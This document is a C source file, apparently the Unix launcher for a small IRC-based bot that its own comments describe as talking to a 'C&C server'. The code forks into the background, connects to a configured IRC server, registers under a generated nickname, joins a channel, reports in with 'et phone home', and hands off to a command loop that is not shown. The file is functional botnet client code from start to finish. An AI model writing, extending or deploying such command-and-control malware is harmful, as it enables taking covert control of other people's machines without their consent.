/*	et_nix.c
	Author: William Woodruff
	------------------------
	The starting point for et on *nix systems.
	Forks, connects to the IRC C&C server, checks in, then calls et_main_loop_nix.
*/

#include "../gen_nick.h"
#include "../cnc_info.h"
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(int argc, char **argv[])
{
	pid_t child = fork();

	if (!child)
	{
		const char *quit = "QUIT";
		char nick[10];
		char message[IRC_MSGLEN];

		int sock;
		struct sockaddr_in server;
		struct hostent *host;

		host = gethostbyname(IRC_SERVER);
		sock = socket(AF_INET, SOCK_STREAM, 0);

		memset(&server, 0, sizeof(struct sockaddr_in));
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = *((unsigned long *) host->h_addr_list[0]);
		server.sin_port = htons(IRC_PORT);

		connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in));

		gen_nick(nick);
		snprintf(message, IRC_MSGLEN, "NICK %s\r\n", nick);
		send(sock, message, strlen(message), 0);
		memset(message, 0, IRC_MSGLEN);
		snprintf(message, IRC_MSGLEN, "USER %s 0 * :et phone home\r\n", nick);
		send(sock, message, strlen(message), 0);
		memset(message, 0, IRC_MSGLEN);
		snprintf(message, IRC_MSGLEN, "JOIN :%s\r\n", IRC_CHANNEL);
		send(sock, message, strlen(message), 0);
		memset(message, 0, IRC_MSGLEN);
		snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s %s\r\n", IRC_CHANNEL, nick, IRC_REPORT);
		send(sock, message, strlen(message), 0);
		memset(message, 0, IRC_MSGLEN);
		
		et_main_loop_nix(sock, nick);

		send(sock, quit, strlen(quit), 0);
		close(sock);

		exit(0);
	}

	exit(0);
}
